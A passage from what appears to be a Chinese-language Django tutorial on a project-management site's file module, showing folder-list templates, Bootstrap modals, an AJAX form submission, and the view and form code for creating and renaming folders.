class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                            &#123;% if item.file_type == 2 %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-default btn-xs"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">data-toggle</span>=<span class="string">"modal"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">data-target</span>=<span class="string">"#addModal"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">data-name</span>=<span class="string">"&#123;&#123; item.name &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">data-fileid</span>=<span class="string">"&#123;&#123; item.id &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">data-whatever</span>=<span class="string">"编辑文件夹"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-pencil-square-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 编辑</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &#123;% else %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-default btn-xs"</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'file_download' project_id=request.tracer.project.id file_id=item.id %&#125;"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-cloud-download"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 下载</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &#123;% endif %&#125;</span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-xs"</span></span></span><br><span class="line"><span class="tag">                               <span class="attr">data-toggle</span>=<span class="string">"modal"</span></span></span><br><span class="line"><span class="tag">                               <span class="attr">data-target</span>=<span class="string">"#delModal"</span></span></span><br><span class="line"><span class="tag">                               <span class="attr">data-fileid</span>=<span class="string">"&#123;&#123; item.id &#125;&#125;"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-trash-o fa-lg"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 删除</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Modal --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"addModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>Modal title<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">                        &#123;% csrf_token %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"hide"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fileid"</span> <span class="attr">id</span>=<span class="string">"fileid"</span>&gt;</span></span><br><span class="line">                        &#123;% for field in form %&#125;</span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                &#123;&#123; field &#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span>&#123;&#123; field.errors.0 &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        &#123;% endfor %&#125;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>取 消<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btnFormSubmit"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>确 定<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade bs-example-modal-sm"</span> <span class="attr">id</span>=<span class="string">"delModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">aria-labelledby</span>=<span class="string">"mySmallModalLabel"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog modal-sm"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-danger alert-dismissible fade in"</span> <span class="attr">role</span>=<span class="string">"alert"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span>&gt;</span>是否确定要删除!<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"padding-top: 20px;padding-bottom: 20px"</span>&gt;</span></span><br><span class="line">                    文件夹中包含的所有文件都会被删除！</span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"text-align: right"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default btn-sm"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span>取 消<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btnDelete"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span>确 定<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"uploadProgress"</span> <span class="attr">class</span>=<span class="string">"upload-progress hide "</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-primary"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-cloud-upload"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 上传进度</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">id</span>=<span class="string">"progressList"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hide"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">"progressTemplate"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-success progress-bar-striped"</span> <span class="attr">role</span>=<span class="string">"progressbar"</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">aria-valuenow</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">aria-valuemin</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">aria-valuemax</span>=<span class="string">"100"</span> <span class="attr">style</span>=<span class="string">"width: 0"</span>&gt;</span></span><br><span class="line">                            0%</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-error"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hide"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">"rowTpl"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-file"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"file_size"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"datetime"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-default btn-xs download"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-cloud-download"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 下载</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-xs delete"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">data-toggle</span>=<span class="string">"modal"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">data-target</span>=<span class="string">"#delModal"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-trash-o fa-lg"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 删除</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 新建与编辑</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 id="11-4-2-给新建模态框的确定绑定事件"><a href="#11-4-2-给新建模态框的确定绑定事件" class="headerlink" title="11.4.2 给新建模态框的确定绑定事件"></a>11.4.2 给新建模态框的确定绑定事件</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        initAddModal();</span><br><span class="line">        bindModelSubmit();</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">initAddModal</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#addModal'</span>).on(<span class="string">'show.bs.modal'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> button = $(event.relatedTarget); <span class="comment">// Button that triggered the modal</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> recipient = button.data(<span class="string">'whatever'</span>); <span class="comment">// Extract info from data-* attributes</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> name = button.data(<span class="string">'name'</span>); <span class="comment">// 获取编辑文件夹的文件名，data-name的值</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> fileid = button.data(<span class="string">'fileid'</span>); <span class="comment">// 获取编辑的文件夹名的id值，data-fileid的值</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> modal = $(<span class="keyword">this</span>);</span></span><br><span class="line"><span class="actionscript">            modal.find(<span class="string">'.modal-title'</span>).text(recipient);</span></span><br><span class="line"></span><br><span class="line">            if (fileid) &#123;</span><br><span class="line"><span class="actionscript">                <span class="comment">// 编辑</span></span></span><br><span class="line"><span class="actionscript">                modal.find(<span class="string">'#id_name'</span>).val(name); <span class="comment">// 打开模态框后，有该文件夹名的值</span></span></span><br><span class="line"><span class="actionscript">                modal.find(<span class="string">'#fileid'</span>).val(fileid);</span></span><br><span class="line"><span class="actionscript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 新建</span></span></span><br><span class="line"><span class="actionscript">                modal.find(<span class="string">'.error-msg'</span>).empty();   <span class="comment">// 清空错误信息</span></span></span><br><span class="line"><span class="javascript">                $(<span class="string">'#form'</span>)[<span class="number">0</span>].reset(); <span class="comment">// 重置form表单，用于每次点击弹出模态框里面的值都为空</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">    <span class="comment">// 绑定模态框的确定按钮事件，用于编辑和新建</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindModelSubmit</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#btnFormSubmit'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">                    url: location.href, <span class="comment">// 向自己发送</span></span></span><br><span class="line"><span class="actionscript">                    type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="javascript">                    data: $(<span class="string">'#form'</span>).serialize(),</span></span><br><span class="line"><span class="actionscript">                    dataType: <span class="string">"JSON"</span>,</span></span><br><span class="line"><span class="actionscript">                    success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                        if (res.status) &#123;</span><br><span class="line">                            location.href = location.href</span><br><span class="line"><span class="actionscript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                            $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                                $(<span class="string">'#id_'</span> + key).next().text(value[<span class="number">0</span>])</span></span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="11-4-3-视图函数代码"><a href="#11-4-3-视图函数代码" class="headerlink" title="11.4.3 视图函数代码"></a>11.4.3 视图函数代码</h4><p> 由于上面的知识点已经为文件管理创建了url路径，下面直接书写file的视图函数代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.forms <span class="keyword">import</span> model_to_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> utils.tencent.cos <span class="keyword">import</span> delete_file, delete_file_list</span><br><span class="line"><span class="keyword">from</span> web.forms.file <span class="keyword">import</span> FolderModelForm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 文件列表 &amp; 添加文件夹"""</span></span><br><span class="line">    parent_obj = <span class="literal">None</span></span><br><span class="line">    folder_id = request.GET.get(<span class="string">'folder'</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> folder_id.isdecimal():</span><br><span class="line">        parent_obj = models.FileRespository.objects.filter(file_type=<span class="number">2</span>, project=request.tracer.project,id=int(folder_id)).first()</span><br><span class="line"></span><br><span class="line">   <span class="comment">##########  文件列表 &amp; 进入文件夹 ###########</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># POST 添加文件夹 &amp; 文件夹的修改</span></span><br><span class="line">    fileid = request.POST.get(<span class="string">'fileid'</span>, <span class="string">''</span>)</span><br><span class="line">    edit_object = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> fileid.isdecimal():</span><br><span class="line">        edit_object = models.FileRespository.objects.filter(id=int(fileid), project=request.tracer.project,file_type=<span class="number">2</span>).first()</span><br><span class="line">    <span class="keyword">if</span> edit_object:</span><br><span class="line">        form = FolderModelForm(request, folder_id, data=request.POST, instance=edit_object)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        form = FolderModelForm(request, folder_id, data=request.POST)</span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        form.instance.project = request.tracer.project</span><br><span class="line">        form.instance.file_type = <span class="number">2</span></span><br><span class="line">        form.instance.update_user = request.tracer.user</span><br><span class="line">        form.instance.parent = parent_obj</span><br><span class="line"></span><br><span class="line">        form.save()</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h4 id="11-4-5-新建form表单"><a href="#11-4-5-新建form表单" class="headerlink" title="11.4.5 新建form表单"></a>11.4.5 新建form表单</h4><p>在forms文件夹下创建<code>file.py</code>文件用于存放文件管理的form表单。</p><p>form表单判断同一级下的文件夹是否同名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> web.forms.bootstrap <span class="keyword">import</span> BootSrtapForm</span><br><span class="line"><span class="keyword">from</span> utils.tencent.cos <span class="keyword">import</span> check_file</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> django.core.validators <span class="keyword">import</span> ValidationError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FolderModelForm</span><span class="params">(BootSrtapForm, forms.ModelForm)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.FileRespository</span><br><span class="line">        fields = [<span class="string">'name'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, request, parent_obj, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.request = request</span><br><span class="line">        self.parent_obj = parent_obj</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = self.cleaned_data[<span class="string">'name'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 数据库判断 当前目录下 此文件夹是否已存在</span></span><br><span class="line">        queryset = models.FileRespository.objects.filter(file_type=<span class="number">2</span>, name=name, project=self.request.tracer.project)</span><br><span class="line">        <span class="keyword">if</span> self.parent_obj:</span><br><span class="line">            exists = queryset.filter(parent=self.parent_obj).exists()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exists = queryset.filter(parent__isnull=<span class="literal">True</span>).exists()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> exists:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'文件夹已存在'</span>)</span><br><span class="line">        <span class="keyword">return</span> name</span><br></pre></td></tr></table></figure><h3 id="11-5-文件列表-amp-进入文件夹"><a href="#11-5-文件列表-amp-进入文件夹" class="headerlink" title="11.5 文件列表 &amp; 进入文件夹"></a>11.5 文件列表 &amp; 